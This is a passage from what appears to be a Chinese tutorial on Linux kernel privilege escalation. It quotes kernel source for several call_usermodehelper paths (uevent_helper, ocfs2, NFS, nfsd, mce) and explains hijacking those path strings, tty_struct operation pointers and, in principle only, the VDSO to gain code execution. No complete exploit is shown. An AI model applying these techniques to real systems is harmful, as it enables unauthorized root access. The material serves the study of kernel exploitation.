        retval = init_uevent_argv(env, subsystem);
        if (retval)
            goto exit;

        retval = -ENOMEM;
        info = call_usermodehelper_setup(env-&gt;argv[0], env-&gt;argv,
                         env-&gt;envp, GFP_KERNEL,
                         NULL, cleanup_uevent_env, env);
        if (info) `{`
            retval = call_usermodehelper_exec(info, UMH_NO_WAIT);
            env = NULL;    /* freed by cleanup_uevent_env */
        `}`
    `}`
#endif
    ......
`}`
</code></pre>
`init_uevent_argv`实现于`/source/lib/kobject_uevent.c#L129`
<pre><code class="lang-c hljs cpp">static int init_uevent_argv(struct kobj_uevent_env *env, const char *subsystem)
`{`
    int len;

    len = strlcpy(&amp;env-&gt;buf[env-&gt;buflen], subsystem,
              sizeof(env-&gt;buf) - env-&gt;buflen);
    if (len &gt;= (sizeof(env-&gt;buf) - env-&gt;buflen)) `{`
        WARN(1, KERN_ERR "init_uevent_argv: buffer size too smalln");
        return -ENOMEM;
    `}`

    env-&gt;argv[0] = uevent_helper;
    env-&gt;argv[1] = &amp;env-&gt;buf[env-&gt;buflen];
    env-&gt;argv[2] = NULL;

    env-&gt;buflen += len + 1;
    return 0;
`}`
</code></pre>
`uevent_helper`定义于`/v4.6-rc1/source/lib/kobject_uevent.c#L32`
<pre><code class="lang-c hljs cpp">#ifdef CONFIG_UEVENT_HELPER
char uevent_helper[UEVENT_HELPER_PATH_LEN] = CONFIG_UEVENT_HELPER_PATH;
#endif
</code></pre>
在`CONFIG_UEVENT_HELPER`被设置的情况下，我们只需要劫持`uevent_helper`然后执行`kobject_uevent_env`即可
</li>
<li>
`ocfs2_leave_group`函数函数实现于`/v4.6-rc1/source/fs/ocfs2/stackglue.c#L426`
<pre><code class="lang-c hljs cpp">/*
 * Leave the group for this filesystem.  This is executed by a userspace
 * program (stored in ocfs2_hb_ctl_path).
 */
static void ocfs2_leave_group(const char *group)
`{`
    int ret;
    char *argv[5], *envp[3];

    argv[0] = ocfs2_hb_ctl_path;
    argv[1] = "-K";
    argv[2] = "-u";
    argv[3] = (char *)group;
    argv[4] = NULL;

    /* minimal command environment taken from cpu_run_sbin_hotplug */
    envp[0] = "HOME=/";
    envp[1] = "PATH=/sbin:/bin:/usr/sbin:/usr/bin";
    envp[2] = NULL;

    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    if (ret &lt; 0) `{`
        printk(KERN_ERR
               "ocfs2: Error %d running user helper "
               ""%s %s %s %s"n",
               ret, argv[0], argv[1], argv[2], argv[3]);
    `}`
`}`
</code></pre>
`ocfs2_hb_ctl_path`定义于`/v4.6-rc1/source/fs/ocfs2/stackglue.c#L426`
<pre><code class="lang-c hljs cpp">static char ocfs2_hb_ctl_path[OCFS2_MAX_HB_CTL_PATH] = "/sbin/ocfs2_hb_ctl";
</code></pre>
我们只需要劫持`ocfs2_hb_ctl_path`然后执行`ocfs2_leave_group`即可
</li>
<li>
`nfs_cache_upcall`函数函数实现于`/v4.6-rc1/source/fs/nfs/cache_lib.c#L34`
<pre><code class="lang-c hljs cpp">int nfs_cache_upcall(struct cache_detail *cd, char *entry_name)
`{`
    static char *envp[] = `{` "HOME=/",
        "TERM=linux",
        "PATH=/sbin:/usr/sbin:/bin:/usr/bin",
        NULL
    `}`;
    char *argv[] = `{`
        nfs_cache_getent_prog,
        cd-&gt;name,
        entry_name,
        NULL
    `}`;
    int ret = -EACCES;

    if (nfs_cache_getent_prog[0] == '')
        goto out;
    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    /*
     * Disable the upcall mechanism if we're getting an ENOENT or
     * EACCES error. The admin can re-enable it on the fly by using
     * sysfs to set the 'cache_getent' parameter once the problem
     * has been fixed.
     */
    if (ret == -ENOENT || ret == -EACCES)
        nfs_cache_getent_prog[0] = '';
out:
    return ret &gt; 0 ? 0 : ret;
`}`
</code></pre>
`nfs_cache_getent_prog`定义于`/v4.6-rc1/source/fs/nfs/cache_lib.c#L23`
<pre><code class="lang-c hljs cpp">static char nfs_cache_getent_prog[NFS_CACHE_UPCALL_PATHLEN] = "/sbin/nfs_cache_getent";
</code></pre>
我们只需要劫持`nfs_cache_getent_prog`然后执行`nfs_cache_upcall`即可
</li>
<li>
`nfsd4_umh_cltrack_upcall`函数函数实现于`/v4.6-rc1/source/fs/nfsd/nfs4recover.c#L1198`
<pre><code class="lang-c hljs cpp">static int nfsd4_umh_cltrack_upcall(char *cmd, char *arg, char *env0, char *env1)
`{`
    char *envp[3];
    char *argv[4];
    int ret;

    if (unlikely(!cltrack_prog[0])) `{`
        dprintk("%s: cltrack_prog is disabledn", __func__);
        return -EACCES;
    `}`

    dprintk("%s: cmd: %sn", __func__, cmd);
    dprintk("%s: arg: %sn", __func__, arg ? arg : "(null)");
    dprintk("%s: env0: %sn", __func__, env0 ? env0 : "(null)");
    dprintk("%s: env1: %sn", __func__, env1 ? env1 : "(null)");

    envp[0] = env0;
    envp[1] = env1;
    envp[2] = NULL;

    argv[0] = (char *)cltrack_prog;
    argv[1] = cmd;
    argv[2] = arg;
    argv[3] = NULL;

    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    /*
     * Disable the upcall mechanism if we're getting an ENOENT or EACCES
     * error. The admin can re-enable it on the fly by using sysfs
     * once the problem has been fixed.
     */
    if (ret == -ENOENT || ret == -EACCES) `{`
        dprintk("NFSD: %s was not found or isn't executable (%d). "
            "Setting cltrack_prog to blank string!",
            cltrack_prog, ret);
        cltrack_prog[0] = '';
    `}`
    dprintk("%s: %s return value: %dn", __func__, cltrack_prog, ret);

    return ret;
`}`
</code></pre>
`cltrack_prog`定义于`/v4.6-rc1/source/fs/nfsd/nfs4recover.c#L1069`
<pre><code class="lang-c hljs cpp">static char cltrack_prog[PATH_MAX] = "/sbin/nfsdcltrack";
</code></pre>
我们只需要劫持`cltrack_prog`然后执行`nfsd4_umh_cltrack_upcall`即可
</li>
<li>
`mce_do_trigger`函数函数实现于`/v4.6-rc1/source/arch/x86/kernel/cpu/mcheck/mce.c#L1328`
<pre><code class="lang-c hljs cpp">static void mce_do_trigger(struct work_struct *work)
`{`
    call_usermodehelper(mce_helper, mce_helper_argv, NULL, UMH_NO_WAIT);
`}`
</code></pre>
`mce_helper`定义于`/source/arch/x86/kernel/cpu/mcheck/mce.c#L88`
<pre><code class="lang-c hljs cpp">static char            mce_helper[128];
static char            *mce_helper_argv[2] = `{` mce_helper, NULL `}`;
</code></pre>
我们只需要劫持`mce_helper`然后执行`mce_do_trigger`即可。
</li>
### 第三种提权姿势-劫持`tty_struct`结构体

#### 关于`tty_struct`结构体

当我们在用户空间执行`open("/dev/ptmx", O_RDWR)`时，内核就会在内存中创建一个`tty`结构体

`tty`结构体在`/v4.6-rc1/source/include/linux/tty.h#L259`处定义

```
struct tty_struct `{`
    int    magic;
    struct kref kref;
    struct device *dev;
    struct tty_driver *driver;
    const struct tty_operations *ops;
    int index;

    /* Protects ldisc changes: Lock tty not pty */
    struct ld_semaphore ldisc_sem;
    struct tty_ldisc *ldisc;

    struct mutex atomic_write_lock;
    struct mutex legacy_mutex;
    struct mutex throttle_mutex;
    struct rw_semaphore termios_rwsem;
    struct mutex winsize_mutex;
    spinlock_t ctrl_lock;
    spinlock_t flow_lock;
    /* Termios values are protected by the termios rwsem */
    struct ktermios termios, termios_locked;
    struct termiox *termiox;    /* May be NULL for unsupported */
    char name[64];
    struct pid *pgrp;        /* Protected by ctrl lock */
    struct pid *session;
    unsigned long flags;
    int count;
    struct winsize winsize;        /* winsize_mutex */
    unsigned long stopped:1,    /* flow_lock */
              flow_stopped:1,
              unused:BITS_PER_LONG - 2;
    int hw_stopped;
    unsigned long ctrl_status:8,    /* ctrl_lock */
              packet:1,
              unused_ctrl:BITS_PER_LONG - 9;
    unsigned int receive_room;    /* Bytes free for queue */
    int flow_change;

    struct tty_struct *link;
    struct fasync_struct *fasync;
    int alt_speed;        /* For magic substitution of 38400 bps */
    wait_queue_head_t write_wait;
    wait_queue_head_t read_wait;
    struct work_struct hangup_work;
    void *disc_data;
    void *driver_data;
    spinlock_t files_lock;        /* protects tty_files list */
    struct list_head tty_files;

#define N_TTY_BUF_SIZE 4096

    int closing;
    unsigned char *write_buf;
    int write_cnt;
    /* If the tty has a pending do_SAK, queue it here - akpm */
    struct work_struct SAK_work;
    struct tty_port *port;
`}`;
```

这里比较重要的是其中的`tty_operations`结构体，里面有大量的函数指针

```
struct tty_operations `{`
    struct tty_struct * (*lookup)(struct tty_driver *driver, struct inode *inode, int idx);
    int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
    int  (*open)(struct tty_struct * tty, struct file * filp);
    void (*close)(struct tty_struct * tty, struct file * filp);
    void (*shutdown)(struct tty_struct *tty);
    void (*cleanup)(struct tty_struct *tty);
    int  (*write)(struct tty_struct * tty, const unsigned char *buf, int count);
    int  (*put_char)(struct tty_struct *tty, unsigned char ch);
    void (*flush_chars)(struct tty_struct *tty);
    int  (*write_room)(struct tty_struct *tty);
    int  (*chars_in_buffer)(struct tty_struct *tty);
    int  (*ioctl)(struct tty_struct *tty, unsigned int cmd, unsigned long arg);
    long (*compat_ioctl)(struct tty_struct *tty, unsigned int cmd, unsigned long arg);
    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
    void (*throttle)(struct tty_struct * tty);
    void (*unthrottle)(struct tty_struct * tty);
    void (*stop)(struct tty_struct *tty);
    void (*start)(struct tty_struct *tty);
    void (*hangup)(struct tty_struct *tty);
    int (*break_ctl)(struct tty_struct *tty, int state);
    void (*flush_buffer)(struct tty_struct *tty);
    void (*set_ldisc)(struct tty_struct *tty);
    void (*wait_until_sent)(struct tty_struct *tty, int timeout);
    void (*send_xchar)(struct tty_struct *tty, char ch);
    int (*tiocmget)(struct tty_struct *tty);
    int (*tiocmset)(struct tty_struct *tty, unsigned int set, unsigned int clear);
    int (*resize)(struct tty_struct *tty, struct winsize *ws);
    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
    int (*get_icount)(struct tty_struct *tty, struct serial_icounter_struct *icount);
#ifdef CONFIG_CONSOLE_POLL
    int (*poll_init)(struct tty_driver *driver, int line, char *options);
    int (*poll_get_char)(struct tty_driver *driver, int line);
    void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
#endif
    const struct file_operations *proc_fops;
`}`;
```

如果我们能够劫持其中的指针，我们就可以执行任意指令了。

由于此种方法其实是将任意地址读写转换为了任意地址执行，并没有真正进行提权，因此可以参考第二种姿势完成后续利用。

### 第四种提权姿势-劫持`VDSO`内存区

🚫：此利用路径已被修复，仅能在`Linux Kernel 2.x`及以下版本利用，故此处仅阐述原理，不做利用演示。

#### 关于`VDSO`内存映射

`VDSO(Virtual Dynamic Shared Object)`内存映射是用户态的一块内存映射，这使得内核空间将可以和用户态程序共享一块物理内存，从而加快执行效率，这个内存映射也叫影子内存。当在内核态修改此部分内存时，用户态所访问到的数据同样会改变，这样的数据区在用户态有两块，分别是`vdso`和`vsyscall`。

[![](https://img.lhyerror404.cn/error404/2020-04-28-141344.png)](https://img.lhyerror404.cn/error404/2020-04-28-141344.png)

`vsyscall`和`VDSO`都是为了避免产生传统系统调用模式`INT 0x80/SYSCALL`造成的内核空间和用户空间的上下文切换行为。`vsyscall`只允许`4`个系统调用，且在每个进程中静态分配了相同的地址；`VDSO`是动态分配的，地址随机，可提供超过`4`个系统调用，`VDSO`是`glibc`库提供的功能。

`VDSO`本质就是映射到内存中的`.so`文件，对应的程序可以当普通的`.so`来使用其中的函数。

**在`Kernel 2.x`中，`VDSO`所在的页，在内核态是可读、可写的，在用户态是可读、可执行的。**

`VDSO`在每个程序启动时加载，核心调用的是`init_vdso_vars`函数，在`/v2.6.39.4/source/arch/x86/vdso/vma.c#L38`处实现。

```
static int __init init_vdso_vars(void)
`{`
    int npages = (vdso_end - vdso_start + PAGE_SIZE - 1) / PAGE_SIZE;
    int i;
    char *vbase;

    vdso_size = npages &lt;&lt; PAGE_SHIFT;
    vdso_pages = kmalloc(sizeof(struct page *) * npages, GFP_KERNEL);
    if (!vdso_pages)
        goto oom;
    for (i = 0; i &lt; npages; i++) `{`
        struct page *p;
        p = alloc_page(GFP_KERNEL);
        if (!p)
            goto oom;
        vdso_pages[i] = p;
        copy_page(page_address(p), vdso_start + i*PAGE_SIZE);
    `}`

    vbase = vmap(vdso_pages, npages, 0, PAGE_KERNEL);
    if (!vbase)
        goto oom;

    if (memcmp(vbase, "177ELF", 4)) `{`
        printk("VDSO: I'm broken; not ELFn");
        vdso_enabled = 0;
    `}`

#define VEXTERN(x) 
    *(typeof(__ ## x) **) var_ref(VDSO64_SYMBOL(vbase, x), #x) = &amp;__ ## x;
#include "vextern.h"
#undef VEXTERN
    vunmap(vbase);
    return 0;

 oom:
    printk("Cannot allocate vdson");
    vdso_enabled = 0;
    return -ENOMEM;
`}`
subsys_initcall(init_vdso_vars);
```

在`VDSO`空间初始化时，`VDSO`同时映射在内核空间以及每一个进程的虚拟内存中，向进程映射时，内核将首先查找到一块用户态地址，然后将该块地址的权限设置为VM_READ|VM_EXEC|VM_MAYREAD|VM_MAYWRITE|VM_MAYEXEC，然后利用`remap_pfn_range`将内核页映射过去。

若我们能覆盖`VDSO`的相应利用区，就能执行我们自定义的`shellcode`。

此处利用可参考[Bypassing SMEP Using vDSO Overwrites(使用vDSO重写来绕过SMEP防护)](https://hardenedlinux.github.io/translation/2015/11/25/Translation-Bypassing-SMEP-Using-vDSO-Overwrites.html)



## 参考链接

[【原】Heap Spray原理浅析 – magictong](https://blog.csdn.net/magictong/article/details/7391397)

[【原】linux内核提权系列教程（1）：堆喷射函数sendmsg与msgsend利用 – bsauce](https://xz.aliyun.com/t/6286)

[【原】linux内核提权系列教程（2）：任意地址读写到提权的4种方法 – bsauce](https://xz.aliyun.com/t/6296)
